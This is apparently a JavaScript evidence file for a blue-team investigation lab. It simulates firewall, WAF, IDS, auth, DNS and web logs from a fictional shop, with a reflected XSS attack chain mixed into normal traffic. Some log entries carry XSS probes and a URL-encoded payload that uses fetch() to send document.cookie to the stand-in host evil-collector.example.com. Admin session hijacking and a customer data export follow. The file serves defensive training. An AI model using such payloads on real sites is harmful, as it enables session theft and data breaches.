/**
 * Penumbra Forge — ShopStack Incident Evidence Corpus
 *
 * 200+ chronologically ordered log entries spanning six sources
 * (WAF, Web, Firewall, IDS, Auth, DNS) for the blue team
 * investigation lab.  Contains a reflected XSS attack chain
 * buried in realistic normal traffic noise.
 *
 * API:
 *   EvidenceCorpus.get(scenarioId) → array of log entry objects
 */

(function () {
  'use strict';

  /* ════════════════════════════════════════════════════
     ShopStack Incident — 2024-03-15 14:00–15:30 UTC
     ════════════════════════════════════════════════════

     Attacker:   198.51.100.47
     Victim:     10.0.1.50 (shopstack.lab.penumbraforge.com)
     Exfil:      203.0.113.99 (evil-collector.example.com)
     Admin IP:   10.0.0.5
     Health chk: 10.0.4.55

     Normal users:
       72.44.128.90   — US east coast shopper
       98.22.156.71   — US midwest shopper
       203.0.113.42   — EU shopper (session stolen)
       44.192.88.12   — AWS-hosted bot / shopper (session stolen)
       185.220.101.33 — random scanner (unrelated)
       91.189.92.10   — internal monitoring
       104.16.55.2    — CDN edge node
       172.217.14.99  — Google crawler
       13.107.42.14   — Bing crawler
       52.78.231.108  — KR shopper
     ════════════════════════════════════════════════════ */

  var SHOPSTACK = [];

  /* ── Helper to push entries ──────────────────────── */

  var _id = {
    waf: 0, web: 0, fw: 0, ids: 0, auth: 0, dns: 0
  };

  function makeId(source) {
    _id[source] += 1;
    return source + '-' + String(_id[source]).padStart(3, '0');
  }

  function entry(ts, source, severity, summary, detail, suspicious, evidenceId) {
    var obj = {
      id: makeId(source),
      timestamp: '2024-03-15 ' + ts,
      source: source,
      severity: severity,
      summary: summary,
      detail: detail || null,
      raw: detail ? JSON.stringify(detail, null, 2) : null,
      suspicious: !!suspicious,
      evidenceId: evidenceId || null
    };
    SHOPSTACK.push(obj);
  }

  /* ════════════════════════════════════════════════════
     14:00:00 – 14:14:59  Pre-incident normal traffic
     ════════════════════════════════════════════════════ */

  entry('14:00:01', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 10.0.4.55',
    { queryType: 'A', domain: 'shopstack.lab.penumbraforge.com', srcIp: '10.0.4.55', response: '10.0.1.50', ttl: 300 },
    false, null);

  entry('14:00:02', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    { srcIp: '10.0.4.55', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/api/health', status: 200, bytes: 48, userAgent: 'internal-monitor/1.0' },
    false, null);

  entry('14:00:05', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49201 → 10.0.1.50:443',
    { action: 'ALLOW', proto: 'TCP', srcIp: '72.44.128.90', srcPort: 49201, dstIp: '10.0.1.50', dstPort: 443, rule: 'inbound-https' },
    false, null);

  entry('14:00:06', 'web', 'info',
    '72.44.128.90 GET / — 200 OK — Mozilla/5.0 (Windows NT 10.0)',
    { srcIp: '72.44.128.90', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 18240, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    false, null);

  entry('14:00:12', 'web', 'info',
    '72.44.128.90 GET /products — 200 OK',
    null, false, null);

  entry('14:00:18', 'web', 'info',
    '72.44.128.90 GET /products/wireless-earbuds-pro — 200 OK',
    null, false, null);

  entry('14:00:25', 'dns', 'info',
    'A query cdn.shopstack.lab from 104.16.55.2',
    null, false, null);

  entry('14:00:30', 'web', 'info',
    '104.16.55.2 GET /static/css/main.css — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  entry('14:00:31', 'web', 'info',
    '104.16.55.2 GET /static/js/app.js — 304 Not Modified — CDN-Cache/2.1',
    null, false, null);

  entry('14:00:35', 'fw', 'info',
    'ALLOW TCP 98.22.156.71:51088 → 10.0.1.50:443',
    null, false, null);

  entry('14:00:36', 'web', 'info',
    '98.22.156.71 GET / — 200 OK — Mozilla/5.0 (Macintosh; Intel Mac OS X)',
    { srcIp: '98.22.156.71', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 18240, userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15' },
    false, null);

  entry('14:00:42', 'auth', 'info',
    'Login success user=jthompson from 98.22.156.71',
    { event: 'login_success', user: 'jthompson', srcIp: '98.22.156.71', sessionId: 'sess_user_a91c', mfa: false },
    false, null);

  entry('14:00:55', 'web', 'info',
    '98.22.156.71 GET /products/smart-home-hub — 200 OK',
    null, false, null);

  entry('14:01:02', 'dns', 'info',
    'MX query shopstack.lab.penumbraforge.com from 91.189.92.10',
    { queryType: 'MX', domain: 'shopstack.lab.penumbraforge.com', srcIp: '91.189.92.10', response: 'mail.penumbraforge.com', ttl: 3600 },
    false, null);

  entry('14:01:10', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=WEP-001',
    { srcIp: '72.44.128.90', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/cart/add', status: 200, bytes: 312, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    false, null);

  entry('14:01:22', 'fw', 'info',
    'DENY TCP 185.220.101.33:44012 → 10.0.1.50:22 — policy: deny-ssh-external',
    { action: 'DENY', proto: 'TCP', srcIp: '185.220.101.33', srcPort: 44012, dstIp: '10.0.1.50', dstPort: 22, rule: 'deny-ssh-external' },
    false, null);

  entry('14:01:23', 'ids', 'low',
    'SSH brute force attempt from 185.220.101.33 — 1 attempt blocked',
    { alertId: 'ET-2001219', srcIp: '185.220.101.33', dstIp: '10.0.1.50', dstPort: 22, action: 'ALERT', signature: 'ET SCAN SSH Brute Force' },
    false, null);

  entry('14:01:40', 'web', 'info',
    '98.22.156.71 GET /search?q=bluetooth+speaker — 200 OK',
    null, false, null);

  entry('14:01:55', 'web', 'info',
    '98.22.156.71 GET /products/bluetooth-speaker-xl — 200 OK',
    null, false, null);

  entry('14:02:10', 'fw', 'info',
    'ALLOW TCP 203.0.113.42:60102 → 10.0.1.50:443',
    { action: 'ALLOW', proto: 'TCP', srcIp: '203.0.113.42', srcPort: 60102, dstIp: '10.0.1.50', dstPort: 443, rule: 'inbound-https' },
    false, null);

  entry('14:02:12', 'web', 'info',
    '203.0.113.42 GET / — 200 OK — Mozilla/5.0 (X11; Linux x86_64)',
    { srcIp: '203.0.113.42', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/', status: 200, bytes: 18240, userAgent: 'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/123.0', geo: 'DE' },
    false, null);

  entry('14:02:30', 'auth', 'info',
    'Login success user=mweber from 203.0.113.42',
    { event: 'login_success', user: 'mweber', srcIp: '203.0.113.42', sessionId: 'sess_user_c41b', mfa: false },
    false, null);

  entry('14:02:45', 'web', 'info',
    '203.0.113.42 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:03:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:03:05', 'dns', 'info',
    'PTR query 90.128.44.72.in-addr.arpa from 10.0.1.50',
    null, false, null);

  entry('14:03:15', 'web', 'info',
    '72.44.128.90 GET /cart — 200 OK',
    null, false, null);

  entry('14:03:30', 'web', 'info',
    '72.44.128.90 POST /cart/update — 200 OK — qty=2',
    null, false, null);

  entry('14:03:45', 'fw', 'info',
    'ALLOW TCP 44.192.88.12:37882 → 10.0.1.50:443',
    { action: 'ALLOW', proto: 'TCP', srcIp: '44.192.88.12', srcPort: 37882, dstIp: '10.0.1.50', dstPort: 443, rule: 'inbound-https' },
    false, null);

  entry('14:03:48', 'web', 'info',
    '44.192.88.12 GET /products — 200 OK — Mozilla/5.0 (compatible; bot)',
    { srcIp: '44.192.88.12', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/products', status: 200, bytes: 14820, userAgent: 'Mozilla/5.0 (compatible; DataForSEO/1.0)' },
    false, null);

  entry('14:04:00', 'auth', 'info',
    'Session renewal sess_user_a91c for user=jthompson',
    null, false, null);

  entry('14:04:12', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=BTS-003',
    null, false, null);

  entry('14:04:30', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    { queryType: 'A', domain: 'api.stripe.com', srcIp: '10.0.1.50', response: '54.187.174.169', ttl: 60 },
    false, null);

  entry('14:04:45', 'web', 'info',
    '72.44.128.90 POST /checkout/initiate — 200 OK',
    { srcIp: '72.44.128.90', dstIp: '10.0.1.50', dstPort: 443, method: 'POST', path: '/checkout/initiate', status: 200, bytes: 1480, userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
    false, null);

  entry('14:04:50', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44210 → 54.187.174.169:443 — NAT outbound',
    null, false, null);

  entry('14:05:02', 'web', 'info',
    '72.44.128.90 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:05:15', 'web', 'info',
    '72.44.128.90 GET /checkout/confirmation?order=ORD-88412 — 200 OK',
    null, false, null);

  entry('14:05:30', 'waf', 'low',
    'SQL injection false positive — rule 942100 — 98.22.156.71 GET /search?q=speakers+where+to+buy',
    { rule: '942100', ruleMsg: 'SQL Injection Attack Detected via libinjection', action: 'LOG_ONLY', srcIp: '98.22.156.71', dstIp: '10.0.1.50', method: 'GET', path: '/search?q=speakers+where+to+buy', matchedData: 'where to' },
    false, null);

  entry('14:05:31', 'web', 'info',
    '98.22.156.71 GET /search?q=speakers+where+to+buy — 200 OK',
    null, false, null);

  entry('14:05:50', 'web', 'info',
    '203.0.113.42 GET /products/usb-c-cable-pack — 200 OK',
    null, false, null);

  entry('14:06:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:06:10', 'ids', 'info',
    'New user agent observed: DataForSEO/1.0 from 44.192.88.12',
    { alertId: 'CUSTOM-UA-001', srcIp: '44.192.88.12', userAgent: 'Mozilla/5.0 (compatible; DataForSEO/1.0)', action: 'INFO' },
    false, null);

  entry('14:06:30', 'web', 'info',
    '44.192.88.12 GET /products/mechanical-keyboard — 200 OK',
    null, false, null);

  entry('14:06:45', 'auth', 'info',
    'Login success user=kpatel from 44.192.88.12',
    { event: 'login_success', user: 'kpatel', srcIp: '44.192.88.12', sessionId: 'sess_user_e7f3', mfa: true },
    false, null);

  entry('14:07:00', 'web', 'info',
    '44.192.88.12 GET /account/wishlist — 200 OK',
    null, false, null);

  entry('14:07:15', 'dns', 'info',
    'A query fonts.googleapis.com from 10.0.1.50',
    null, false, null);

  entry('14:07:30', 'fw', 'info',
    'ALLOW TCP 52.78.231.108:58901 → 10.0.1.50:443',
    null, false, null);

  entry('14:07:32', 'web', 'info',
    '52.78.231.108 GET /products — 200 OK — Mozilla/5.0 (iPhone; CPU iPhone OS)',
    { srcIp: '52.78.231.108', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/products', status: 200, bytes: 14820, userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15', geo: 'KR' },
    false, null);

  entry('14:07:50', 'web', 'info',
    '52.78.231.108 GET /search?q=laptop+stand — 200 OK',
    null, false, null);

  entry('14:08:00', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=USB-012',
    null, false, null);

  entry('14:08:15', 'fw', 'info',
    'DENY TCP 185.220.101.33:44055 → 10.0.1.50:3389 — policy: deny-rdp-external',
    null, false, null);

  entry('14:08:30', 'web', 'info',
    '98.22.156.71 GET /products/noise-cancel-headphones — 200 OK',
    null, false, null);

  entry('14:08:45', 'auth', 'low',
    'Login failed user=admin from 72.44.128.90 — invalid password',
    { event: 'login_failed', user: 'admin', srcIp: '72.44.128.90', reason: 'invalid_password', attempts: 1 },
    false, null);

  entry('14:09:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:09:10', 'dns', 'info',
    'A query shopstack.lab.penumbraforge.com from 172.217.14.99',
    null, false, null);

  entry('14:09:12', 'web', 'info',
    '172.217.14.99 GET /robots.txt — 200 OK — Googlebot/2.1',
    { srcIp: '172.217.14.99', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/robots.txt', status: 200, bytes: 245, userAgent: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
    false, null);

  entry('14:09:30', 'web', 'info',
    '172.217.14.99 GET /products/wireless-earbuds-pro — 200 OK — Googlebot/2.1',
    null, false, null);

  entry('14:09:45', 'web', 'info',
    '52.78.231.108 GET /products/laptop-stand-adjustable — 200 OK',
    null, false, null);

  entry('14:10:00', 'web', 'info',
    '52.78.231.108 POST /cart/add — 200 OK — item=LSA-007',
    null, false, null);

  entry('14:10:15', 'fw', 'info',
    'ALLOW TCP 13.107.42.14:62200 → 10.0.1.50:443',
    null, false, null);

  entry('14:10:18', 'web', 'info',
    '13.107.42.14 GET /products/mechanical-keyboard — 200 OK — bingbot/2.0',
    { srcIp: '13.107.42.14', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/products/mechanical-keyboard', status: 200, bytes: 12480, userAgent: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)' },
    false, null);

  entry('14:10:30', 'web', 'info',
    '98.22.156.71 POST /cart/add — 200 OK — item=NCH-005',
    null, false, null);

  entry('14:10:45', 'auth', 'info',
    'Logout user=jthompson session=sess_user_a91c',
    null, false, null);

  entry('14:11:00', 'dns', 'info',
    'A query analytics.shopstack.lab from 10.0.1.50',
    null, false, null);

  entry('14:11:15', 'web', 'info',
    '203.0.113.42 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:11:30', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44280 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:11:45', 'web', 'info',
    '203.0.113.42 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:12:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:12:10', 'web', 'info',
    '203.0.113.42 GET /checkout/confirmation?order=ORD-88413 — 200 OK',
    null, false, null);

  entry('14:12:20', 'waf', 'info',
    'Rate limit check — 98.22.156.71 — 12 req/min — within threshold',
    null, false, null);

  entry('14:12:30', 'web', 'info',
    '52.78.231.108 GET /products/webcam-1080p — 200 OK',
    null, false, null);

  entry('14:12:45', 'fw', 'info',
    'DENY UDP 185.220.101.33:53201 → 10.0.1.50:53 — policy: deny-dns-external',
    null, false, null);

  entry('14:13:00', 'web', 'info',
    '72.44.128.90 GET /account/orders — 200 OK',
    null, false, null);

  entry('14:13:15', 'dns', 'info',
    'PTR query 12.88.192.44.in-addr.arpa from 10.0.1.50',
    null, false, null);

  entry('14:13:30', 'web', 'info',
    '44.192.88.12 GET /search?q=monitor+4k — 200 OK',
    null, false, null);

  entry('14:13:45', 'ids', 'info',
    'Traffic volume 15% above hourly baseline — info only',
    { alertId: 'CUSTOM-VOL-001', action: 'INFO', detail: 'Request rate 42/min vs 36/min baseline' },
    false, null);

  entry('14:14:00', 'web', 'info',
    '98.22.156.71 GET /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:14:15', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44310 → 54.187.174.169:443 — NAT outbound stripe',
    null, false, null);

  entry('14:14:30', 'web', 'info',
    '98.22.156.71 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:14:45', 'web', 'info',
    '98.22.156.71 GET /checkout/confirmation?order=ORD-88414 — 200 OK',
    null, false, null);

  /* ════════════════════════════════════════════════════
     14:15:00 – 14:20:00  Admin session + continued noise
     ════════════════════════════════════════════════════ */

  entry('14:15:00', 'auth', 'info',
    'Login success user=admin from 10.0.0.5 — MFA verified',
    { event: 'login_success', user: 'admin', srcIp: '10.0.0.5', sessionId: 'sess_admin_7f2a', mfa: true },
    true, 'admin-session');

  entry('14:15:02', 'web', 'info',
    '10.0.0.5 GET /admin/dashboard — 200 OK — Mozilla/5.0 (Macintosh)',
    { srcIp: '10.0.0.5', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/dashboard', status: 200, bytes: 8420, userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' },
    true, 'admin-session');

  entry('14:15:10', 'web', 'info',
    '10.0.0.5 GET /admin/orders — 200 OK',
    { srcIp: '10.0.0.5', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/orders', status: 200, bytes: 24100, userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' },
    true, 'admin-session');

  entry('14:15:30', 'web', 'info',
    '10.0.0.5 GET /admin/inventory — 200 OK',
    null, true, 'admin-session');

  entry('14:15:45', 'web', 'info',
    '52.78.231.108 POST /checkout/initiate — 200 OK',
    null, false, null);

  entry('14:16:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:16:10', 'dns', 'info',
    'A query smtp.penumbraforge.com from 10.0.1.50',
    null, false, null);

  entry('14:16:20', 'web', 'info',
    '44.192.88.12 GET /products/4k-monitor-27 — 200 OK',
    null, false, null);

  entry('14:16:30', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49305 → 10.0.1.50:443',
    null, false, null);

  entry('14:16:35', 'web', 'info',
    '72.44.128.90 GET /products — 200 OK',
    null, false, null);

  entry('14:16:50', 'web', 'info',
    '10.0.0.5 POST /admin/orders/ORD-88412/ship — 200 OK',
    null, true, 'admin-session');

  entry('14:17:00', 'web', 'info',
    '52.78.231.108 POST /checkout/payment — 200 OK',
    null, false, null);

  entry('14:17:15', 'web', 'info',
    '52.78.231.108 GET /checkout/confirmation?order=ORD-88415 — 200 OK',
    null, false, null);

  entry('14:17:30', 'auth', 'info',
    'Session renewal sess_user_c41b for user=mweber',
    null, false, null);

  entry('14:17:45', 'web', 'info',
    '203.0.113.42 GET /search?q=phone+case — 200 OK',
    null, false, null);

  entry('14:18:00', 'waf', 'low',
    'SQL injection false positive — rule 942100 — 44.192.88.12 GET /search?q=select+a+gift',
    { rule: '942100', ruleMsg: 'SQL Injection Attack Detected via libinjection', action: 'LOG_ONLY', srcIp: '44.192.88.12', dstIp: '10.0.1.50', method: 'GET', path: '/search?q=select+a+gift', matchedData: 'select a' },
    false, null);

  entry('14:18:01', 'web', 'info',
    '44.192.88.12 GET /search?q=select+a+gift — 200 OK',
    null, false, null);

  entry('14:18:15', 'web', 'info',
    '72.44.128.90 GET /search?q=usb+hub — 200 OK',
    null, false, null);

  entry('14:18:30', 'fw', 'info',
    'ALLOW TCP 10.0.1.50:44330 → 142.250.80.46:443 — NAT outbound google analytics',
    null, false, null);

  entry('14:18:45', 'dns', 'info',
    'A query www.google-analytics.com from 10.0.1.50',
    null, false, null);

  entry('14:19:00', 'web', 'info',
    '10.0.4.55 GET /api/health — 200 OK — internal-monitor/1.0',
    null, false, null);

  entry('14:19:10', 'web', 'info',
    '203.0.113.42 GET /products/phone-case-leather — 200 OK',
    null, false, null);

  entry('14:19:20', 'web', 'info',
    '72.44.128.90 GET /products/usb-hub-7port — 200 OK',
    null, false, null);

  entry('14:19:35', 'ids', 'info',
    'New user agent observed: bingbot/2.0 from 13.107.42.14',
    null, false, null);

  entry('14:19:50', 'web', 'info',
    '44.192.88.12 POST /cart/add — 200 OK — item=MON-009',
    null, false, null);

  /* ════════════════════════════════════════════════════
     14:20:00 – 14:26:00  ATTACK CHAIN (interleaved)
     ════════════════════════════════════════════════════ */

  entry('14:20:00', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=UHB-002',
    null, false, null);

  entry('14:20:15', 'web', 'info',
    '203.0.113.42 POST /cart/add — 200 OK — item=PCL-011',
    null, false, null);

  /* --- ATTACK: DNS recon --- */
  entry('14:20:30', 'dns', 'medium',
    'A query shopstack.lab.penumbraforge.com from 198.51.100.47 — FIRST SEEN source',
    { queryType: 'A', domain: 'shopstack.lab.penumbraforge.com', srcIp: '198.51.100.47', response: '10.0.1.50', ttl: 300, firstSeen: true },
    true, 'recon');

  entry('14:20:45', 'web', 'info',
    '98.22.156.71 GET /products — 200 OK',
    null, false, null);

  entry('14:21:00', 'web', 'info',
    '10.0.0.5 GET /admin/reports/daily — 200 OK',
    null, true, 'admin-session');

  entry('14:21:15', 'auth', 'info',
    'Session renewal sess_user_e7f3 for user=kpatel',
    null, false, null);

  entry('14:21:30', 'dns', 'info',
    'A query api.stripe.com from 10.0.1.50',
    null, false, null);

  /* --- ATTACK: Port scan --- */
  entry('14:21:55', 'ids', 'medium',
    'Port scan detected from 198.51.100.47 — probed ports 80, 443, 8080, 8443 on 10.0.1.50',
    { alertId: 'ET-2002911', srcIp: '198.51.100.47', dstIp: '10.0.1.50', ports: [80, 443, 8080, 8443], action: 'ALERT', signature: 'ET SCAN Potential HTTP/HTTPS Port Scan' },
    true, 'recon');

  entry('14:22:00', 'fw', 'info',
    'DENY TCP 198.51.100.47:38901 → 10.0.1.50:8080 — policy: deny-non-standard',
    { action: 'DENY', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 38901, dstIp: '10.0.1.50', dstPort: 8080, rule: 'deny-non-standard' },
    true, 'recon');

  entry('14:22:02', 'fw', 'info',
    'DENY TCP 198.51.100.47:38902 → 10.0.1.50:8443 — policy: deny-non-standard',
    { action: 'DENY', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 38902, dstIp: '10.0.1.50', dstPort: 8443, rule: 'deny-non-standard' },
    true, 'recon');

  entry('14:22:08', 'web', 'info',
    '44.192.88.12 GET /checkout/initiate — 200 OK',
    null, false, null);

  /* --- ATTACK: Firewall allow on 443 --- */
  entry('14:22:14', 'fw', 'info',
    'ALLOW TCP 198.51.100.47:38910 → 10.0.1.50:443',
    { action: 'ALLOW', proto: 'TCP', srcIp: '198.51.100.47', srcPort: 38910, dstIp: '10.0.1.50', dstPort: 443, rule: 'inbound-https' },
    true, 'recon');

  entry('14:22:20', 'web', 'info',
    '98.22.156.71 GET /search?q=wireless+charger — 200 OK',
    null, false, null);

  /* --- ATTACK: Recon searches --- */
  entry('14:22:30', 'web', 'info',
    '198.51.100.47 GET /search?q=test — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=test', status: 200, bytes: 4210, userAgent: 'python-requests/2.31.0' },
    true, 'recon');

  entry('14:22:35', 'web', 'info',
    '198.51.100.47 GET /search?q=monitor — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=monitor', status: 200, bytes: 5180, userAgent: 'python-requests/2.31.0' },
    true, 'recon');

  /* --- ATTACK: Directory discovery --- */
  entry('14:22:42', 'web', 'info',
    '198.51.100.47 GET /robots.txt — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/robots.txt', status: 200, bytes: 245, userAgent: 'python-requests/2.31.0' },
    true, 'recon');

  /* --- ATTACK: HTML injection test --- */
  entry('14:22:45', 'web', 'medium',
    '198.51.100.47 GET /search?q=<b>test</b> — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=%3Cb%3Etest%3C%2Fb%3E', status: 200, bytes: 4280, userAgent: 'python-requests/2.31.0' },
    true, 'xss-payload');

  entry('14:22:45', 'waf', 'medium',
    'XSS probe detected — rule 941110 — 198.51.100.47 GET /search — action: LOG_ONLY',
    { rule: '941110', ruleMsg: 'XSS Filter - Category 1: Script Tag Vector', action: 'LOG_ONLY', srcIp: '198.51.100.47', dstIp: '10.0.1.50', method: 'GET', path: '/search?q=%3Cb%3Etest%3C%2Fb%3E', matchedData: '<b>test</b>', paranoia: 1 },
    true, 'xss-payload');

  entry('14:22:48', 'web', 'info',
    '72.44.128.90 GET /products/wireless-charger-pad — 200 OK',
    null, false, null);

  /* --- ATTACK: Script tag (blocked) --- */
  entry('14:22:52', 'web', 'medium',
    '198.51.100.47 GET /search?q=<script>alert(1)</script> — 403 Forbidden — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', status: 403, bytes: 218, userAgent: 'python-requests/2.31.0' },
    true, 'xss-payload');

  entry('14:22:52', 'waf', 'high',
    'XSS BLOCKED — rule 941100 — 198.51.100.47 GET /search — script tag blocked',
    { rule: '941100', ruleMsg: 'XSS Attack Detected via libinjection', action: 'BLOCK', srcIp: '198.51.100.47', dstIp: '10.0.1.50', method: 'GET', path: '/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', matchedData: '<script>alert(1)</script>', paranoia: 1 },
    true, 'xss-payload');

  entry('14:22:56', 'web', 'info',
    '44.192.88.12 POST /checkout/payment — 200 OK',
    null, false, null);

  /* --- ATTACK: Successful XSS payload (img onerror) --- */
  entry('14:23:01', 'web', 'high',
    '198.51.100.47 GET /search?q=<img src=x onerror=alert(document.cookie)> — 200 OK — python-requests/2.31.0',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E', status: 200, bytes: 4350, userAgent: 'python-requests/2.31.0', reflected: true },
    true, 'xss-payload');

  entry('14:23:01', 'waf', 'high',
    'XSS DETECTED — rule 941100 — 198.51.100.47 GET /search — action: DETECTED (monitor mode, NOT blocked)',
    { rule: '941100', ruleMsg: 'XSS Attack Detected via libinjection', action: 'DETECTED', srcIp: '198.51.100.47', dstIp: '10.0.1.50', method: 'GET', path: '/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E', matchedData: '<img src=x onerror=alert(document.cookie)>', paranoia: 1, note: 'WAF in monitor mode — detection only, no block' },
    true, 'xss-payload');

  /* --- ATTACK: Payload delivered, reflected in response --- */
  entry('14:23:05', 'web', 'high',
    '198.51.100.47 GET /search?q=<img src=x onerror=...> — 200 OK — reflected payload in response body — 2847 bytes',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/search?q=%3Cimg%20src%3Dx%20onerror%3Dfetch(%27https%3A%2F%2Fevil-collector.example.com%2F%3Fc%3D%27%2Bdocument.cookie)%3E', status: 200, bytes: 2847, userAgent: 'python-requests/2.31.0', reflected: true, note: 'Full exfiltration payload with fetch() to evil-collector.example.com' },
    true, 'xss-payload');

  entry('14:23:10', 'web', 'info',
    '98.22.156.71 GET /products/wireless-charger-pad — 200 OK',
    null, false, null);

  entry('14:23:20', 'web', 'info',
    '203.0.113.42 GET /products/phone-case-leather — 200 OK',
    null, false, null);

  entry('14:23:30', 'fw', 'info',
    'ALLOW TCP 72.44.128.90:49410 → 10.0.1.50:443',
    null, false, null);

  entry('14:23:40', 'web', 'info',
    '72.44.128.90 GET /account/profile — 200 OK',
    null, false, null);

  entry('14:23:50', 'dns', 'info',
    'A query cdn.shopstack.lab from 10.0.1.50',
    null, false, null);

  /* --- ATTACK: Exfil domain resolution --- */
  entry('14:24:02', 'dns', 'high',
    '10.0.1.50 resolves evil-collector.example.com — FIRST SEEN, no prior history',
    { queryType: 'A', domain: 'evil-collector.example.com', srcIp: '10.0.1.50', response: '203.0.113.99', ttl: 60, firstSeen: true, note: 'Never queried before from this network' },
    true, 'exfil-domain');

  /* --- ATTACK: Outbound connection to exfil server --- */
  entry('14:24:03', 'fw', 'high',
    'ALLOW TCP 10.0.1.50:55201 → 203.0.113.99:443 — outbound HTTPS to unknown destination',
    { action: 'ALLOW', proto: 'TCP', srcIp: '10.0.1.50', srcPort: 55201, dstIp: '203.0.113.99', dstPort: 443, rule: 'outbound-https-default', note: 'First connection to 203.0.113.99 from internal network' },
    true, 'exfil-domain');

  /* --- ATTACK: Session hijack — admin --- */
  entry('14:24:05', 'auth', 'critical',
    'Admin session sess_admin_7f2a used from NEW IP 198.51.100.47 — was 10.0.0.5',
    { event: 'session_ip_change', user: 'admin', sessionId: 'sess_admin_7f2a', previousIp: '10.0.0.5', newIp: '198.51.100.47', note: 'Session cookie likely stolen via XSS' },
    true, 'session-hijack');

  entry('14:24:08', 'web', 'info',
    '52.78.231.108 GET /checkout/confirmation?order=ORD-88416 — 200 OK',
    null, false, null);

  /* --- ATTACK: Admin dashboard access from attacker --- */
  entry('14:24:10', 'web', 'high',
    '198.51.100.47 GET /admin/dashboard — 200 OK — python-requests/2.31.0 — using stolen admin session',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/dashboard', status: 200, bytes: 8420, userAgent: 'python-requests/2.31.0', sessionId: 'sess_admin_7f2a' },
    true, 'session-hijack');

  entry('14:24:15', 'web', 'info',
    '72.44.128.90 POST /cart/add — 200 OK — item=WCP-004',
    null, false, null);

  /* --- ATTACK: Customer data export --- */
  entry('14:24:18', 'web', 'critical',
    '198.51.100.47 GET /admin/users/export — 200 OK — 4.2MB — customer data export',
    { srcIp: '198.51.100.47', dstIp: '10.0.1.50', dstPort: 443, method: 'GET', path: '/admin/users/export', status: 200, bytes: 4404019, userAgent: 'python-requests/2.31.0', sessionId: 'sess_admin_7f2a', note: 'Bulk customer data export including PII' },
    true, 'data-export');

  entry('14:24:20', 'web', 'info',
    '98.22.156.71 GET /products/desk-lamp-led — 200 OK',
    null, false, null);

